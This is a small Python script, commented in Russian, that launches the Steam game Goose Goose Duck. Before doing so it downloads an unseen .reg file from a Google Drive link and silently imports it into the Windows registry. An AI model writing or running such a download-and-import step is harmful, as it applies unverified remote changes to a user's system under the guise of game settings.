import os
import subprocess
import urllib.request
import winreg
import webbrowser

def download_and_import_registry(url, save_path):
    """Скачивает и импортирует файл."""
    try:
        urllib.request.urlretrieve(url, save_path)
        print(f"Файл скачан: {save_path}")
        subprocess.run(["reg", "import", save_path], check=True, shell=True)
        print("Настройки успешно добавлены в реестр.")
    except Exception as e:
        print(f"Ошибка: {e}")

def launch_game():
    """Проверяет Steam и устанавливает запускает игру."""
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Valve\Steam") as key:
            winreg.QueryValueEx(key, "InstallPath")
            print("Установка (если нужно) и запуск Goose Goose Duck...")
            webbrowser.open("steam://install/1568590")
            webbrowser.open("steam://run/1568590")
    except Exception:
        print("Steam не найден. Убедитесь, что он установлен.")

if __name__ == "__main__":
    reg_url = "https://drive.google.com/uc?export=download&id=18Yr6wfSAJZTqhttMFVDNx7pZkez2vJBq"
    reg_file = os.path.join(os.getenv("TEMP"), "settings.reg")
    
    download_and_import_registry(reg_url, reg_file)
    launch_game()